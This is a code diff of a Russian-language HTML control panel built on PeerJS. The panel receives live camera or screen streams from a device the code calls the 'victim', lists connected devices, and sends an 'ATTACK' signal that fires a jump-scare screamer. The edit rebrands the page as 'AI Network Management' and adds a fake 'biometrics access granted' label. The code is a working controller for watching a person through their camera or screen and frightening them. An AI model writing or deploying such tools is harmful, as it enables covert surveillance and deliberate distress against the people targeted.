@@ -1,103 +1,81 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Панель Управления (Ваниш)</title>
+    <title>Управление Сетью AI</title>
     <meta charset="utf-8">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; margin: 0; padding: 20px; }
-        .container { display: flex; flex-direction: column; align-items: center; }
+        body { background: #0b0b0b; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; }
         
-        /* Видео трансляция */
-        #remoteVideo { 
-            width: 100%; max-width: 700px; 
-            border: 5px solid #ff0050; border-radius: 15px; 
-            background: black; margin-bottom: 20px; 
-        }
+        /* Боковая панель со списком */
+        .sidebar { width: 300px; background: #151515; border-right: 1px solid #333; padding: 20px; display: flex; flex-direction: column; }
+        .user-item { background: #222; padding: 10px; margin-bottom: 10px; border-radius: 8px; border-left: 4px solid #ff0050; cursor: pointer; }
+        .user-item:hover { background: #282828; }
+        .status-online { color: #00ff00; font-size: 12px; font-weight: bold; }
 
-        /* Кнопки управления */
-        .controls { 
-            background: #2a2a2a; padding: 20px; 
-            border-radius: 15px; border: 1px solid #444; 
-            width: 100%; max-width: 400px; 
-        }
-        .btn-scary { 
-            background: #ff0000; color: white; border: none; 
-            padding: 20px; width: 100%; font-size: 20px; 
-            font-weight: bold; border-radius: 10px; cursor: pointer;
-            box-shadow: 0 5px 15px rgba(255,0,0,0.4);
-            text-transform: uppercase;
-        }
-        .btn-scary:active { transform: scale(0.95); }
+        /* Основная зона */
+        .main { flex-grow: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        video { width: 100%; max-width: 800px; border-radius: 12px; border: 2px solid #333; background: #000; margin-bottom: 20px; }
         
-        .status-tag { color: #00ff00; font-size: 18px; margin-bottom: 10px; font-weight: bold; }
-        #device-info { color: #ccc; margin-bottom: 20px; }
+        .controls { width: 100%; max-width: 400px; text-align: center; }
+        .btn-attack { background: #ff0050; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; }
+        .btn-attack:hover { background: #ff2e6e; box-shadow: 0 0 20px rgba(255, 0, 80, 0.4); }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>МОНИТОР ТРАНСЛЯЦИИ</h2>
-        <div id="status" class="status-tag">ОЖИДАНИЕ ЖЕРТВЫ...</div>
-        <div id="device-info">Подключите устройство через index.html</div>
+    <div class="sidebar">
+        <h3>Подключенные устройства</h3>
+        <div id="user-list">
+            <p style="color: #666;">Поиск активных сессий...</p>
+        </div>
+    </div>
 
+    <div class="main">
+        <h2 id="view-title">Мониторинг: Ожидание...</h2>
         <video id="remoteVideo" autoplay playsinline controls></video>
 
-        <div class="controls">
-            <p>Управление пранком:</p>
-            <button class="btn-scary" onclick="sendAttack()">⚡ ЗАПУСТИТЬ СКРИМЕР ⚡</button>
-            <p style="font-size: 12px; color: #777; margin-top: 10px;">
-                Нажми, когда жертва будет максимально близко к экрану
-            </p>
+        <div class="controls" id="attack-panel" style="display: none;">
+            <p>Доступ к биометрии: <span style="color: #00ff00;">РАЗРЕШЕН</span></p>
+            <button class="btn-attack" onclick="sendAttack()">⚡ АКТИВИРОВАТЬ СКРИМЕР ⚡</button>
         </div>
     </div>
 
     <script>
-        const MY_ID = '09062012'; // Твой фиксированный ID
-        const peer = new Peer(MY_ID, {
-            config: { 'iceServers': [{ url: 'stun:stun.l.google.com:19302' }] }
-        });
+        const MY_ID = '09062012'; //
+        const peer = new Peer(MY_ID);
+        let currentConn = null;
 
-        let activeConnection = null;
-
-        // 1. Слушаем входящие подключения (для обмена данными/командами)
         peer.on('connection', (conn) => {
-            activeConnection = conn;
-            console.log("Соединение для команд установлено");
-            
-            conn.on('open', () => {
-                document.getElementById('status').innerText = "СВЯЗЬ УСТАНОВЛЕНА";
-            });
+            currentConn = conn;
+            updateUserList(conn.metadata.device); //
+            document.getElementById('attack-panel').style.display = 'block';
         });
 
-        // 2. Принимаем видеопоток (камера или экран)
         peer.on('call', (call) => {
-            const mode = call.metadata && call.metadata.device ? call.metadata.device : "Устройство";
-            document.getElementById('device-info').innerText = "РЕЖИМ: " + mode;
-            document.getElementById('status').innerText = "ТРАНСЛЯЦИЯ ИДЕТ";
-
-            call.answer(); 
-            call.on('stream', (remoteStream) => {
-                const video = document.getElementById('remoteVideo');
-                video.srcObject = remoteStream;
-                video.play();
+            call.answer(); //
+            call.on('stream', (stream) => {
+                document.getElementById('remoteVideo').srcObject = stream;
+                document.getElementById('view-title').innerText = "ТРАНСЛЯЦИЯ АКТИВНА";
             });
         });
 
-        // Функция отправки сигнала "АТАКА"
-        function sendAttack() {
-            if (activeConnection && activeConnection.open) {
-                activeConnection.send('ATTACK');
-                console.log("Сигнал скримера отправлен!");
-            } else {
-                alert("Ошибка: Жертва еще не подключилась или соединение разорвано.");
-            }
+        function updateUserList(device) {
+            const list = document.getElementById('user-list');
+            list.innerHTML = `
+                <div class="user-item">
+                    <strong>ID: ${Math.floor(Math.random() * 99999)}</strong><br>
+                    <span>Устройство: ${device}</span><br>
+                    <span class="status-online">● В СЕТИ (LIVE)</span>
+                </div>
+            `;
         }
 
-        peer.on('error', (err) => {
-            console.error('Ошибка:', err);
-            if(err.type === 'unavailable-id') alert('ID занят! Закрой другие вкладки монитора.');
-        });
+        function sendAttack() {
+            if (currentConn && currentConn.open) {
+                currentConn.send('ATTACK'); //
+            }
+        }
     </script>
 </body>
 </html>
